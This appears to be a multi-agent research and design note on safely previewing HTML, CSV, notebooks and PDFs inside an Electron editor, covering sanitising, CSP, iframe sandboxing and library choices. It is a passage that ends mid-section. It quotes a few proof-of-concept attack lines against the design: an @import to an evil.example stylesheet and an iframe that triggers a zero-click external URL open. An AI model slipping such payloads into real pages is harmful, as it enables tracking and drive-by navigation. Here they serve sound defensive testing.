   stripped if you sanitise a string that already contains them. Sanitise
   first with `RETURN_DOM: true`, then rewrite the URLs on the returned DOM.
   That is also the order that keeps the rewrite testable.
2. It keeps `<style>@import url(https://evil.example/x.css)</style>` when you
   allow `<style>`. The remote fetch is then blocked by `style-src 'self'`, so
   nothing loads. The protection here is the policy, not the sanitiser. If the
   policy ever gains a remote style source, this becomes a live tracking
   channel. Write that down next to the sanitiser call.

### 2.5 The recipe, and the two bugs it exists to prevent

I built the full pipeline and ran a real page through it. Sanitise with
DOMPurify, rewrite every relative `src` to an absolute `gmux-asset:` URL, drop
remote image sources, replace `<link rel=stylesheet>` with the file's contents
read from disk, serialise, and hand the string to `<iframe sandbox="" srcdoc>`.

Results on an istanbul-style coverage report of 39,883 bytes with an external
stylesheet, an image, two `<script>` tags and `onclick` handlers on the table
headers.

| Step | Time |
| --- | --- |
| DOMPurify sanitise | 6.4 ms |
| URL rewrite pass | 0.2 ms |
| Serialise | 0.1 ms |
| Frame `load` event | 75 ms |

Zero `<script>` tags and zero `onclick` attributes survived. The stylesheet was
inlined and applied. The image loaded through `gmux-asset:`.

Results on a real 5,242,737-byte document, which is the text reader's 5 MB cap
exactly.

| Step | Time |
| --- | --- |
| DOMPurify sanitise | 30 ms |
| Serialise | 14 ms |
| Frame `load` event | 48 ms |

So the worst case a user can reach is about 92 ms of work. No streaming, no
worker and no virtualisation is needed.

Now the two bugs. Both are real, both were reproduced, and both are invisible
until someone clicks.

**Bug one. A fragment link loads Tortie inside the preview.** Relative URLs in
an `about:srcdoc` document resolve against the parent document's URL. I clicked
an ordinary `<a href="#deep">` inside the frame. The frame navigated to
`file:///…/app/index.html#deep`, which is the application's own page, and
Chromium logged "Blocked script execution in
'file:///…/index.html#deep' because the document's frame is sandboxed". The
sandbox is the only reason the app did not boot a second time inside its own
preview pane. In the dev server the same click would fetch
`http://localhost:<port>/…`.

**Bug two. Any link click destroys the pane.** I clicked a relative link in a
sandboxed frame. The frame navigated to `chrome-error://chromewebdata/` and the
document was gone. The sandbox attribute does not prevent a frame navigating
itself.

The fix for both is one line of injected markup plus one rewrite pass.

| Injected `<base>` | Fragment click | Document survives | Relative `<img>` still resolves |
| --- | --- | --- | --- |
| none | navigates to the app's own page | no | yes |
| `about:srcdoc` | scrolls, `scrollY` went 0 to 1093 | yes | no |
| `gmux-asset://local/<dir>/` | `chrome-error://chromewebdata/` | no | yes |
| `about:blank` | replaces the document | no | no |

Inject `<base href="about:srcdoc">` as the first child of `<head>`. Fragment
links then behave like fragment links. Because relative URLs no longer resolve,
every `src` must already be an absolute `gmux-asset:` URL, and I confirmed an
absolute one still loads under that base with `naturalWidth` at the true 64 px.
Every `href` that is not a fragment must be rewritten, because a click on one
under this base sends the frame to `about:blank#blocked` and the document does
not survive. Rewrite them to nothing and give the anchor a title that says the
link is not live, or resolve them to a path and open them as a new editor tab.
The markdown preview already does the second thing through
`requestOpenFile`, but it can only do it because it renders in React and owns
the click. The HTML preview cannot own the click, because a script cannot run
inside the frame. So the honest answer for HTML is that links are dead except
for fragments, unless you accept a much larger design.

### 2.6 What an HTML preview will not do

Say all of this in the UI, once, quietly.

- A page whose content is produced by JavaScript renders empty. A React or
  Vue build output shows the empty mount point and nothing else. This is the
  common case for `dist/index.html`, and it is the thing a user is most likely
  to try first.
- Remote fonts, remote stylesheets, remote images and remote scripts do not
  load. Local ones do, if we inline them or rewrite them.
- Links other than in-page anchors do nothing.
- Forms do nothing.
- `<video>` and `<audio>` do not play unless their sources are rewritten and
  `media-src` is widened. `media-src` falls back to `default-src 'self'` today,
  so leave them alone and let them render as inert boxes.

## 3. The libraries, one row per candidate

Everything verified against the npm registry and the GitHub API on 2026-08-12.

| Package | Version | Licence | Last publish | Repo last push | Runtime deps | Size | Native or binary | Works under the policy | Verdict |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| dompurify | 3.4.13 | MPL-2.0 or Apache-2.0 | 2026-08-03 | 2026-08-10 | 0 | 10.9 KB gzip | no | yes, measured | **Take it.** The HTML sanitiser |
| anser | 2.3.5 | MIT | 2025-12-15 | n/a | 0 | 4.5 KB gzip | no | yes, measured | **Take it** if notebooks ship. ANSI in cell output |
| pdfjs-dist | 6.2.108 | Apache-2.0 | 2026-07-28 | 2026-08-12 | 0 | 502 KB gzip JS plus 2.9 MB assets | wasm, not native | yes, with `isEvalSupported: false` | Take it only if the built-in viewer is rejected |
| papaparse | 5.5.4 | MIT | 2026-06-19 | 2026-07-03 | 0 | 7.1 KB gzip | no | yes | **Reject.** 40 lines of our own matched it |
| sanitize-html | 2.17.6 | MIT | 2026-07-10 | n/a | 7 | not measured | no | server-shaped | Reject. Seven dependencies including postcss, and it is built for Node |
| notebookjs | 0.8.3 | MIT | 2024-08-18 | 2024-08-18 | 4, including jsdom | 28 KB unpacked | no | no | Reject. jsdom in a renderer bundle, and two years without a release |
| @signcl/react-ipynb-renderer | 2.2.8 | Apache-2.0 | 2025-08-11 | n/a | 9 | 4.06 MB unpacked | no | probably | Reject. Brings a second markdown stack and react-syntax-highlighter next to our Shiki |
| mermaid | 11.16.1 | MIT | 2026-08-04 | n/a | 21 | 83.5 MB unpacked | no | needs checking | Out of scope for this round. Note it below |
| csv-parse | 7.0.2 | MIT | 2026-08-02 | n/a | 0 | 1.6 MB unpacked | no | yes | Reject. Same reason as papaparse |
| Platform Sanitizer API | Chromium 150 | n/a | n/a | n/a | 0 | 0 | no | yes | Reject for now. Its default allowlist has no `img` and no `style` |

Two notes on that table.

`anser` was last pushed to GitHub on 2025-11-15 and last published on
2025-12-15, so it is eight months quiet. It is 23 KB of code that converts
terminal colour codes into spans, the format it parses was frozen decades ago,
and it has 0 dependencies. Quiet is the correct state for this library. It also
escapes HTML in its input, which I checked, because notebook output is
untrusted too.

`papaparse` has a packaging wrinkle worth knowing even though I am rejecting
it. Bundling `papaparse.js` fails, because line 931 calls `require('stream')`
inside its Node duplex streamer. You have to point the bundler at
`papaparse.min.js` instead. It also ships no ESM build and no types, so it
would pull `@types/papaparse` into devDependencies as well.

## 4. Where the answer is no library at all

**CSV needs no library.** I wrote a 40-line RFC 4180 reader and put it head to
head with papaparse on a 4,723,838-byte file of 60,001 rows whose fourth column
contains commas and doubled quotes inside quotes.

| Reader | Rows | Time | Output on the tricky quoting case |
| --- | --- | --- | --- |
| 40 lines of ours | 60,001 | 38 ms | identical |
| papaparse 5.5.4 | 60,001 | 24 ms | identical |

Papaparse is 14 ms faster on a five megabyte file, which is the largest file
the text reader will hand us. That is not worth a dependency, a types package
and a bundler workaround. The hard part of a CSV viewer is not parsing. It is
deciding what to do about 60,000 rows on screen, and no parser helps with that.
Cap the rendered rows the way the editor already caps bytes, say so in a
banner, and the whole feature is one component and one pure function.

**SVG needs no library and already has none.** `src/renderer/editor/image/`
renders it as a `data:` URL inside an `<img>`, which cannot run script and
cannot load anything remote. That is the right answer and it is already shipped.
Do not replace it.

**Notebooks need almost no library.** The nbformat file is documented JSON. The
work is to walk `cells`, send `markdown` cells through the markdown renderer
this repository already owns, send `code` cells through Shiki which it also
owns, and render the four output kinds. Only `stream` output needs anything
new, and that is anser. Every notebook package I found either brings jsdom, or
brings a second markdown pipeline and a second syntax highlighter that would
sit next to ours doing the same job worse.

**Plain text, JSON, YAML and TOML need nothing.** Monaco is already in the tree
and is already the answer.

**Mermaid is a trap for this round.** It is 83.5 MB unpacked with 21
dependencies, including a second markdown parser, katex, cytoscape and d3. If
`.mmd` preview is ever wanted, it needs its own research note and its own
decision. Do not let it ride along with this phase.

## 5. PDF, the one real choice

Both options work. I rendered the same PDF with each and took screenshots.

**Option A, pdfjs-dist 6.2.108.** It rendered page 1 to a 918 by 1188 canvas in
92 ms with `isEvalSupported: false`, which is the setting that keeps it away
from `new Function`. 38,741 pixels were non-white, so it really drew. The text
layer came back with the page's string, so find and select are possible later.
The cost is size and packaging.

| Artifact | Raw | Gzipped |
| --- | --- | --- |
| `pdf.min.mjs` | 454,669 | 129,519 |
| `pdf.worker.min.mjs` | 1,262,398 | 372,309 |

Plus files that are not JavaScript and must be copied into the build by hand,
because electron-vite bundles renderer dependencies into `out/renderer` and the
asar excludes the rest. That is 1.6 MB of cmaps for CJK text, 800 KB of
standard fonts for documents that do not embed theirs, and 1.5 MB of wasm
(`openjpeg.wasm` at 252,032 bytes for JPEG 2000, `jbig2.wasm` at 104,852,
`qcms_bg.wasm` at 96,589, `quickjs-eval.wasm` at 469,105 for form scripting,
which we would not enable). The wasm is not native node code, so there is no
`electron-rebuild` step and no extra signing work beyond the files being inside
the bundle. The wasm pieces carry their own licences, BSD 2-clause for openjpeg
and the PDFium licence for jbig2, which the licence page would need to list.

**Option B, Chromium's built-in PDF viewer.** An `<embed type="application/pdf">`
pointed at a same-origin URL rendered under the current policy with no changes
at all, toolbar included. Pointed at a `gmux-asset:` URL it was blocked twice,
and the two blocks are worth stating exactly, because the first fix alone does
nothing.

1. With the policy as it is today, "Loading plugin data from
   'gmux-asset://local/PROBE/sample.pdf' violates the following Content
   Security Policy directive: default-src 'self'. Note that 'object-src' was
   not explicitly set".
2. After adding `object-src 'self' gmux-asset:`, it was still blocked, because
   the viewer loads the document into an internal frame. "Framing
   'gmux-asset://local/' violates the following Content Security Policy
   directive: default-src 'self'. Note that 'frame-src' was not explicitly
   set".
3. After adding `frame-src 'self' gmux-asset:` as well, the main process served
   the file and Chromium's viewer rendered it with page navigation, zoom,
   rotate, annotate, download and print.

So option B costs two new directives and an entry for `.pdf` in the protocol
handler's extension allowlist. It buys a viewer with no bytes shipped.

| | pdfjs-dist | Built-in viewer |
| --- | --- | --- |
| New runtime dependency | yes | no |
| Bundle cost | 502 KB gzip JS plus 2.9 MB of assets | 0 |
| Policy change | none | `object-src` and `frame-src` gain `gmux-asset:` |
| Protocol change | none | `.pdf` joins the served extensions |
| Chrome of the viewer | ours, themed | Chromium's own, light, not themed |
| Text selection and find | ours to build | free, and better than we would build |
| Print and download buttons | absent unless we add them | present, and they are foreign UI inside Tortie |
| Failure mode | a chunk that fails to load | none new |

My recommendation is option B, and the deciding reason is the scope guardrail
in CLAUDE.md. A PDF viewer is IDE furniture. It is the price of admission, not
the product. Shipping 3.4 MB and a canvas renderer to draw a file the operating
system already draws is exactly the parity work the guardrail says to justify
or skip. The honest cost of option B is that the pane will contain a light grey
Chromium toolbar that does not follow the theme, and the download button will
save a copy of a file the user already has. If that is unacceptable, take
option A and accept the megabytes. There is no third answer that is small and
also ours.

One caution on widening `frame-src`. Today `frame-src` is unset, so it falls
back to `default-src 'self'`, and that fallback is what blocks `blob:` and
`data:` frames. Setting it explicitly to `'self' gmux-asset:` keeps both of
those blocked, which I confirmed by reading the blocks in that configuration.
It does mean the renderer could frame any file the asset protocol will serve,
so the extension allowlist in `src/main/assets/protocol.ts` becomes the thing
holding the line, and `.pdf` must be added narrowly rather than by relaxing the
check.

## 6. The shape a new viewer has to fit

I read `src/renderer/editor/EditorPanel.tsx`, `src/renderer/editor/store.ts`,
`src/renderer/editor/tab-io.ts`, the whole of
`src/renderer/editor/markdown/` and the whole of
`src/renderer/editor/image/`. Here is what a new viewer must satisfy.

### 6.1 The mode control

`modeOptions(tab, splitFits)` at `EditorPanel.tsx:188` builds the segmented
control from the tab's own flags. It is a plain array of
`{mode, label, icon, title, disabled}`. `ModeToggle` renders labels while they
fit and falls back to codicons below `300 + 65 × optionCount` pixels of panel
width. The control hides itself entirely when there are fewer than two options.

The markdown branch is the one the operator is pointing at.

```ts
if (tab.markdown || tab.svg) {
  // Preview | Source | Split, with Split disabled below 480 px
}
```

An HTML tab wants exactly that branch. The cleanest change is to widen the
condition to a single "this file has a rendered form" flag rather than adding a
third and fourth name to the test. Note the existing `noun` variable already
generalises the tooltip copy, so `Edit the HTML source` comes almost free.

`EditorMode` is `'diff' | 'file' | 'preview' | 'split' | 'image'` at
`store.ts:77`. **No new mode value is needed for HTML, CSV or notebooks.**
They are all `preview`, `file` and `split`, which is the whole point of the
request. A PDF is different, because it has no text side at all, and it should
follow the raster image pattern rather than the markdown one.

### 6.2 How a tab decides which viewer it gets

`openFromRequest` in `store.ts` computes three booleans when the tab is created
and stores them on the tab. Nothing recomputes them later.

| Flag | Source | Meaning |
| --- | --- | --- |
| `markdown` | `isMarkdownPath(req.path)` | Preview is rendered markdown |
| `svg` | `isSvgPath(req.path)` from `@shared/image-types` | Preview is the picture, source is the markup |
| `image` | `isImagePath(req.path) && (svg || commit === null)` | The image viewer owns the tab |

The initial mode is then a chain at `store.ts:475`. A navigation with a line
number wins, then a diff request or a commit, then markdown reads the
remembered mode from `localStorage['gmux.markdownMode']`, then SVG opens in
`preview`, then a raster image opens in `image`, then everything else opens in
`file`.

`setMode` writes `gmux.markdownMode` back whenever a markdown tab changes to a
non-diff mode. If HTML, CSV and notebooks each remembered their own last mode
they would each need a key, which is three more keys. Simpler and better: one
key for "the last mode chosen on a previewable text file", shared. That matches
what a user means when they set Split once and expect it to stick.

There is a fourth thing the flags drive, at `store.ts:297`.

```ts
function landsInText(image: boolean, svg: boolean): boolean {
  return !image || svg;
}
```

A search hit or a go-to-line request forces a line-less surface back to `file`
mode, because there is nowhere to put line 412 on a rendered page. HTML, CSV
and notebooks are all text, so they all land in text and this function needs no
change for them. A PDF is not text and must be added to the exception.

### 6.3 How split mode works

Split is not a component. It is nine lines in `EditorPanel.tsx` around line
742.

```tsx
) : effectiveMode === 'split' ? (
  <div className="ed-split">
    <div className="ed-split-pane">{monaco}</div>
    <div className="ed-split-pane">{preview}</div>
  </div>
) : (
```

`preview` is chosen just above, at line 596, and today it is a two-way pick
between `ImageView` and `MarkdownPreview`. A new viewer joins that expression
and gets Split for free. Three rules bind whatever joins it.

1. **The right pane takes `live`.** `live={effectiveMode === 'split'}` tells the
   viewer to follow the unsaved buffer instead of `tab.savedContents`. Both
   existing viewers do it through one hook, `useLiveTabText(tab.id,
   tab.savedContents, live)` in `src/renderer/editor/live-text.ts`. A new viewer
   must use that hook and no other route to the buffer, or Split will silently
   show the file as it was on disk.
2. **Split collapses to Source below 480 px** of panel width, computed once as
   `splitFits` and applied as `effectiveMode`. The viewer sees only
   `effectiveMode` and needs no width logic of its own.
3. **Do not focus the scroller when `live` is true.** In Split the source pane
   owns the keyboard. `MarkdownPreview` does this with
   `if (!live) scrollerRef.current?.focus({preventScroll: true})` and
   `ImageView` passes `focusOnOpen={!live}`.

A live HTML preview in Split rebuilds the whole srcdoc string on every
keystroke. At 6.4 ms for a 40 KB page that is fine, but it will flash, because
replacing `srcdoc` reloads the frame and loses scroll position. Debounce it,
and keep the scroll offset across rebuilds. This is a real piece of work and it
is the one part of the HTML viewer that is harder than the markdown one.

### 6.4 How the theme reaches the viewer

Through CSS custom properties, and only inside the app's own document. Every
editor surface has a colocated stylesheet that uses tokens from
`src/renderer/styles/tokens.css` and no literals.
`src/renderer/editor/image/image.css` says so in its own second line, "tokens
only, no literals".

**A srcdoc iframe does not see those tokens.** It is a separate document and
custom properties do not cross the boundary. So an HTML preview has to carry
its own base styling into the frame, and there are only two honest choices.

- Inject a small `<style>` block with resolved colour values, read from the
  parent with `getComputedStyle(document.documentElement).getPropertyValue`.
  The page's own rules then override ours, which is correct, because a
  repository page that styles itself should look like itself.
- Inject nothing and let the frame use Chromium's defaults, which is a white
  page with black text. In the dark theme that is a bright rectangle in the
  middle of the app on every preview.

Take the first. It is about fifteen lines and it is the difference between a
preview that belongs in Tortie and one that does not. The frame itself must
also get `background: var(--bg-…)` from our side, so the moment before the
document paints is not white.

### 6.5 What the image viewer does about reading a project file

This was the specific question, and the answer has two halves that are
deliberately different.

**An SVG is read as text through the ordinary path.** There is no special
reader. `tab-io.ts` calls `window.gmux.fs.readFile(path)`, the same call every
`.ts` file uses, and the result lands in `tab.savedContents`. The preview then
turns the markup into a `data:` URL in
`src/renderer/editor/image/source.ts`.

```ts
export function svgDataUrl(markup: string): string {
  return `data:image/svg+xml;charset=utf-8,${encodeURIComponent(markup)}`;
}
```

The comment above it explains the one trap, which is that base64 through `btoa`
corrupts non-ASCII characters in diagram labels, so it percent-encodes instead.
Because the bytes came through the text reader, Source mode, save with command
S, and Split against the unsaved buffer all work with no new code. That is the
whole reason SVG got the markdown-shaped control.

**A raster image is never read as text.** `fs:readFile` refuses anything with a
NUL byte in its first 8192 bytes with the message "… is a binary file — Tortie
edits text files only" (`src/main/fs/ipc.ts`). So images take a second channel,
`fs:readImage`, declared in `src/shared/image-types.ts`. It does two things a
URL cannot. It enforces a 32 MB cap with a stat rather than a read, and it can
answer for the HEAD revision, which only git can produce and which therefore
comes back as a base64 `data:` URL. The working copy never crosses IPC at all.
It comes back as a `gmux-asset://local/<absolute path>` URL and Chromium streams
it from disk.

**Which of the two a preview should reuse depends entirely on whether the file
is text.**

| New type | Reader to reuse | Why |
| --- | --- | --- |
| HTML | `fs:readFile`, the text path | It is text. Source mode, save and Split all come free, exactly as they did for SVG |
| CSV and TSV | `fs:readFile` | Same |
| `.ipynb` | `fs:readFile` | It is JSON. A notebook is editable as text and people do edit it |
| PDF | neither, today | It is binary, so `fs:readFile` refuses it, and `fs:readImage` will not serve it because `.pdf` is not in `IMAGE_EXTENSIONS` |

So for three of the four types the mechanism to reuse is the plain text reader,
and the SVG precedent is the exact template. The only invention needed is for
PDF, and both PDF options need the same small thing, which is for the asset
protocol to serve one more extension. Note that the protocol's allowlist is
`IMAGE_EXTENSIONS` itself, shared with the editor so that "what Tortie can
display" and "what the handler will stream" cannot drift. Adding `.pdf` to
`IMAGE_EXTENSIONS` would be wrong, because that set also decides what opens in
the image viewer. The handler needs its own slightly larger set, built from the
image set plus the preview set, with the reason written down.

There is one more thing the image viewer does that a preview should copy.
`ImageView` passes `revision={tab.imageRevision}` and the URL carries a `?v=`
that changes when the file watcher sees the file change. Without it Chromium
serves the cached bitmap while an agent rewrites the chart underneath. An HTML
preview whose images come from the same scheme has the same problem and needs
the same cache-buster.

### 6.6 The five states a viewer must answer for

`imageSourceFor` in `src/renderer/editor/image/source.ts` is a pure function
returning one of `loading`, `ready`, `too-large`, `missing` or `error`, and it
is unit tested without a DOM. The comment says why it lives outside the
component, which is so the component cannot grow a second opinion about what
"too large" means. Every new viewer should have the same pure function next to
it and the same test. For HTML the states are the same five. For CSV there is a
sixth, which is "parsed, but showing the first N rows of M".

Also copy the truncation rule. An SVG that hit the 5 MB text cap is refused
rather than rendered, because half a picture looks like a bug rather than a
boundary. Half an HTML document is worse, because an unclosed tag swallows the
rest of the page. Refuse a truncated HTML file with the over-cap state.

## 7. File by file change list

Sizes are the number of lines I expect each file to be, based on the size of
the sibling that already does the same job. Anything marked new is a new module.

### 7.1 HTML preview, which is the operator's actual request

| File | New | Lines | What it holds |
| --- | --- | --- | --- |
| `src/shared/preview-types.ts` | new | 90 | The shared "what can be previewed" contract, shaped like `image-types.ts`. `isHtmlPath`, `isCsvPath`, `isNotebookPath`, `isPdfPath`, and the extension to media type map. Shared because main's protocol handler and the renderer must not drift |
| `src/renderer/editor/html/index.ts` | new | 20 | Barrel. Two exports, the component and the predicate, exactly like `markdown/index.ts` |
| `src/renderer/editor/html/html-loader.ts` | new | 35 | Lazy chunk loader. A near copy of `markdown-loader.ts`, so opening a `.ts` file never pays for DOMPurify |
| `src/renderer/editor/html/sanitize.ts` | new | 170 | The pipeline and the reasons. DOMPurify configuration, the `<base href="about:srcdoc">` injection, the `src` rewrite to `gmux-asset:`, the remote-source drop, the href neutralisation, the stylesheet inlining. Pure functions over strings and DOM, so it is testable without a renderer |
| `src/renderer/editor/html/HtmlPreview.tsx` | new | 190 | The light half. Scroll region, the five states, the live buffer subscription, the debounce, the scroll-position restore across rebuilds, the theme base style |
| `src/renderer/editor/html/html-impl.ts` | new | 60 | The heavy half behind the lazy loader. Imports DOMPurify and re-exports the build function |
| `src/renderer/editor/html/html.css` | new | 130 | Colocated, tokens only. The frame, its ground colour, the banner for "scripts do not run here" |
| `src/renderer/editor/html/__tests__/sanitize.test.ts` | new | 220 | The attack document, the base injection, the URL rewrite, the truncation refusal. This is where the security claims become executable |
| `src/renderer/editor/EditorPanel.tsx` | edit | +45 | `modeOptions` gains the HTML branch, the `preview` expression gains a third arm, `minimapApplies` excludes it |
| `src/renderer/editor/store.ts` | edit | +30 | The `html` flag on `EditorTab`, the initial mode chain, the shared last-mode key |
| `src/renderer/editor/index.ts` | edit | +2 | Nothing, unless the panel needs the predicate |

That is about 990 new lines, of which 220 are tests, plus 77 lines of edits to
two existing files. One new runtime dependency.

### 7.2 CSV and TSV

| File | New | Lines | What it holds |
| --- | --- | --- | --- |
| `src/renderer/editor/csv/csv-parse.ts` | new | 70 | The RFC 4180 reader, the delimiter sniff, the row cap |
| `src/renderer/editor/csv/CsvPreview.tsx` | new | 200 | The table, the sticky header, the row-cap banner, the live subscription |
| `src/renderer/editor/csv/csv.css` | new | 100 | Colocated, tokens only |
| `src/renderer/editor/csv/index.ts` | new | 15 | Barrel |
| `src/renderer/editor/csv/__tests__/csv-parse.test.ts` | new | 140 | Quoting, embedded newlines, ragged rows, empty fields, the cap |
| `src/renderer/editor/EditorPanel.tsx` | edit | +10 | One more arm |
| `src/renderer/editor/store.ts` | edit | +8 | One more flag |

About 525 lines. No new dependency.

### 7.3 Jupyter notebooks

| File | New | Lines | What it holds |
| --- | --- | --- | --- |
| `src/renderer/editor/notebook/nbformat.ts` | new | 130 | The types and one normalise function, because nbformat v3 and v4 disagree about `source` being a string or an array of strings |
| `src/renderer/editor/notebook/outputs.tsx` | new | 190 | The four output kinds. `stream` through anser, `display_data` and `execute_result` by picking the richest mime type we can render, `error` through anser as well |
| `src/renderer/editor/notebook/NotebookPreview.tsx` | new | 230 | Cell list, execution counts, collapse, the live subscription. Markdown cells go to the existing `markdown-impl`, code cells to the existing Shiki highlighter |
| `src/renderer/editor/notebook/notebook.css` | new | 150 | Colocated, tokens only |
| `src/renderer/editor/notebook/index.ts` | new | 15 | Barrel |
| `src/renderer/editor/notebook/__tests__/nbformat.test.ts` | new | 160 | v3 and v4, string and array sources, every output kind, a corrupt file |
| `src/renderer/editor/EditorPanel.tsx` | edit | +10 | One more arm |
| `src/renderer/editor/store.ts` | edit | +8 | One more flag |

About 900 lines. One new dependency, anser, and only for the ANSI colours.

Note one thing before building this. A notebook's `display_data` output holds
base64 PNGs inline. They are already `data:` URLs by the time they reach an
`<img>`, and `img-src` already allows `data:`, so they need no protocol work.
That is a pleasant surprise and worth confirming early with a real notebook.

### 7.4 PDF, if option B is taken

| File | New | Lines | What it holds |
| --- | --- | --- | --- |
| `src/renderer/editor/pdf/PdfView.tsx` | new | 90 | The `<embed>`, the states, the missing-file case |
| `src/renderer/editor/pdf/index.ts` | new | 12 | Barrel |
| `src/renderer/editor/pdf/pdf.css` | new | 60 | Colocated |
| `src/renderer/index.html` | edit | +2 directives on line 8 | `object-src 'self' gmux-asset:` and `frame-src 'self' gmux-asset:` |
| `src/main/assets/protocol.ts` | edit | +20 | A served-extension set that is the image set plus `.pdf`, with the reason written down, and the symlink recheck kept |
| `src/shared/preview-types.ts` | edit | +15 | The served set, so main and the renderer share one list |
| `src/renderer/editor/store.ts` | edit | +12 | The `pdf` flag, the mode default, the `landsInText` exception |
| `src/renderer/editor/EditorPanel.tsx` | edit | +8 | One more arm, and no mode control, because a PDF has one view |
| `src/renderer/editor/pdf/__tests__/paths.test.ts` | new | 60 | The predicate and the served-set agreement |

About 222 new lines and 57 lines of edits. No new dependency. The CSP edit is
the part that needs a verifier, not a reviewer.

If option A is taken instead, replace the first three rows with a `PdfView.tsx`
of about 260 lines, a `pdf-loader.ts` of 40, a `pdf.css` of 110, roughly 30
lines in `electron.vite.config.ts` for the worker entry and the asset copy, and
an `electron-builder.yml` change, and add `pdfjs-dist` to dependencies. The CSP
and the protocol are then untouched.

## 8. What is not true, and what I did not check

- **I did not build any of this.** Every number above comes from a standalone
  harness, not from Tortie. The pipeline I timed is my own 60-line version of
  what `sanitize.ts` would be, not the real thing.
- **I did not test the dev server.** Everything ran from `file://`. In
  `electron-vite dev` the renderer is served over `http://localhost`, and the
  fragment-link bug will point at the dev server instead of a file path. The
  fix, `<base href="about:srcdoc">`, does not depend on the origin, but I have
  not proved that.
- **I did not measure DOMPurify against a hostile document written by someone
  trying to escape it.** I wrote the attack document myself and I am not a
  browser security researcher. The claim I am making is narrower than "this is
  safe". It is "the policy blocks scripts, the sandbox blocks navigation and
  gives an opaque origin, and DOMPurify is a third lock". Each was measured
  separately.
- **`<style>@import url(https://…)` survives the sanitiser.** It is inert only
  because `style-src` has no remote source. That is a dependency between two
  files that must be written down at both ends.
- **I did not check what happens to a preview when the file changes on disk**
  while it is open. The image viewer solves this with a revision counter. I am
  asserting the HTML preview needs the same thing rather than having seen it
  fail.
- **I did not test a notebook end to end**, because I did not have a real
  `.ipynb` with rich output to hand. The claim that base64 images work because
  `img-src` allows `data:` is read off the policy, not measured against a real
  notebook.
- **The line counts in section 7 are estimates**, taken from the size of the
  sibling that does the same job. `MarkdownPreview.tsx` is 6.1 KB and
  `ImageView.tsx` is 14.5 KB, so a 190-line `HtmlPreview.tsx` is in the right
  band, but it is not a measurement.
- **The built-in PDF viewer's toolbar cannot be themed or removed.** I saw it
  in the screenshot. It is light grey with a download button and a print
  button. Anyone who says otherwise should be asked for a screenshot.
- **I did not price the accessibility of any of this.** A sandboxed iframe is a
  separate document for a screen reader, and I do not know how the editor's
  existing region labelling behaves across that boundary.

## 9. Reconciling with part 1, which recommends a different delivery

Part 1 of this document recommends serving the file from a new `gmux-preview:`
scheme with its own CSP response header, and adding `frame-src gmux-preview:`
to the application policy. I measured the `srcdoc` route instead. Both work.
The two parts do not disagree about any measurement. They disagree about which
cost to pay, and the integrator has to pick one. Here is what my numbers add to
that choice, so the pick is made on evidence rather than on which part was read
last.

**Part 1 is right that the sandbox attribute is not a network control, and my
run agrees.** Every block I saw came from the policy. In my three frame
configurations the console named `script-src`, `img-src` and `frame-src` as the
thing refusing, never the sandbox. The sandbox stopped navigation and gave an
opaque origin, and that is all I claim for it.

**Three of my findings change the size of the gap between the two designs.**

1. Part 1's table says the `srcdoc` route "loses every stylesheet". That is true
   for `<link rel=stylesheet>`, and it is fixable. I read the linked file from
   disk and replaced the `<link>` with a `<style>` holding its contents. The
   page then rendered with its own colours. Inline `<style>` blocks and `style`
   attributes were never lost, and I measured both applying inside the frame.
   The cost of the fix is one extra `fs:readFile` per stylesheet and 6.4 ms of
   sanitising for a 40 KB page.
2. Part 1's table says the `srcdoc` route does not render local images. That is
   not what I measured. A `gmux-asset:` image loaded inside a frame carrying
   `sandbox=""`, which is an opaque origin, and the main process logged the
   request. Images work today with no scheme and no policy change, as long as
   the rewrite makes the URL absolute.
3. Part 1's advantage on links is real and I confirmed the cost of not having
   it. Under `srcdoc` a fragment link navigates the frame to the application's
   own page, and any other link destroys the pane. Injecting
   `<base href="about:srcdoc">` fixes fragments and leaves every other link
   dead. A real URL, which is what the scheme gives, does not have this problem
   at all.

**So the honest comparison is narrower than either part alone suggests.**

| | `srcdoc` plus rewriting | `gmux-preview:` scheme |
| --- | --- | --- |
| Application policy | unchanged | one directive added |
| New privileged scheme | none | one, and its handler is the whole trust boundary |
| What the handler may serve | images only, the existing allowlist | HTML, CSS, images, fonts, and whatever else a page references |
| Local stylesheets | work, by us inlining them | work, natively |
| Local images | work today, measured | work natively |
| Links between pages | dead, except fragments | work |
| Sanitiser needed | yes, DOMPurify, 10.9 KB gzip | probably not, the response header blocks scripts |
| Where a mistake shows up | in our rewrite pass, in the renderer, unit testable without a DOM | in a main-process handler that serves files by path |

**The dependency question flips on this choice, so state it plainly.** My
recommendation of DOMPurify assumes the `srcdoc` route, where our own code has
to decide what reaches the frame. If part 1's scheme is taken, the response
header does that job, the file is served as authored, and there is no sanitiser
and no new runtime dependency at all. Under that design the HTML preview costs
zero packages. That is a point in part 1's favour that part 1 does not make.

**What I would ask before choosing.** The scheme's handler decides which files
leave the disk, and unlike `gmux-asset:` it cannot be held to an image
allowlist, because a page references stylesheets and fonts. Part 1 says the
handler serves only inside the project root. That containment is now the whole
boundary, and it has to survive symlinks, `..` segments and percent-encoded
separators. `src/main/assets/protocol.ts` already resolves symlinks and
rechecks the extension afterwards for exactly this reason, and it says why in a
comment. Whoever builds the new handler should copy that pattern and its test,
not write a fresh one.

Everything in sections 3 to 7 above is unaffected by the choice. The library
verdicts for notebooks, CSV, SVG and PDF, the integration shape, and the file
by file change list all hold either way, apart from the HTML rows, which lose
`sanitize.ts` and gain a main-process handler if part 1 wins.


---

# Agent 4. The adversary. What I would cut, change and confirm

Date: 2026-08-13. Electron 43.3.0, the repository's own binary. Nothing in `/Users/gdc/gmux/src`
was written, no package was installed into the repository, and no tmux session was touched.

Harness, fixtures and raw logs are at
`/private/tmp/claude-501/-Users-gdc-gmux/ecc455c7-2dc3-4598-9927-35e8f3a31c15/scratchpad/advprev/`.
Six probe applications, `main.js` through `main6.js`, with results in `out.json`, `out3.json`,
`out4.json`, `out5.json`, `out6.json` and the console logs `run.log` through `run6.log`. The
containment attacks are in `symlink.mjs`, which is plain Node and needs no Electron.

## 1. The answer, first

I attacked part 1's recommendation and it held everywhere except one place. Keep the sandboxed
iframe of a `gmux-preview:` scheme with a per-response Content Security Policy header, and keep
`frame-src gmux-preview:`. Cut the `__external` sentinel from section 7.1.

**The sentinel is a zero-click call to `shell.openExternal` with a URL the repository author
chose.** A previewed page does not need a script and does not need a click. It needs one line.

```html
  <iframe width=1 height=1 src="/__external?u=https%3A%2F%2Fevil.example%2Fzero-click"></iframe>
```

Measured under `sandbox=""` with the child policy from section 7 applied, that line fired
`will-frame-navigate` with the URL below, on load, with nothing clicked.

```
